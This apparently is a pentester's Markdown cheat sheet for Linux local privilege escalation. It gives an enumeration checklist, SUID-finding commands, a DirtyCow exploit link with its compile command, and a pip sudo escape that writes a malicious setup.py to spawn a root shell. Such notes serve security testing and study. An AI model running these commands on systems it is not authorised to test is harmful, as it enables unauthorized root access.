# Local Priv Esc
#linux #lpe
https://gtfobins.github.io/
https://lolbas-project.github.io/#
https://book.hacktricks.xyz/linux-unix/privilege-escalation

- Get OS information
- Check if the sudo version is vulnerable
	- sudo -v
	- sudo -l
- Check the PATH, any writable folder?
	- `set`
- Check env variables, any sensitive detail?
- Search for kernel exploits using scripts (DirtyCow?)
	- https://www.exploit-db.com/exploits/40839
	- gcc -pthread shell.c -o dirty -lcrypt
- Dmesg signature verification failed error?
- More system enum (date, system stats, cpu info, printers)
- Enumerate more defenses


# Sticky-Bit

```

find / -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;

```

# Find files belonging to user

`find / -user low 2>/dev/null | egrep -v "proc|venv"`
`find / -group low 2>/dev/null | egrep -v "proc|venv"`

# Exploit via Path if SUID-Binary does not use full path
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

# Exploit lxd group
https://www.hackingarticles.in/lxd-privilege-escalation/

# pip
`pip3 install <local_dir>` searches the local dir for a setup.py and executes it. Helpfull if pip is in the sudoers or sbit.

Alternative (https://gtfobins.github.io/gtfobins/pip/):
```
TF=$(mktemp -d)
echo "import os;os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo -H /usr/bin/pip3 install $TF
```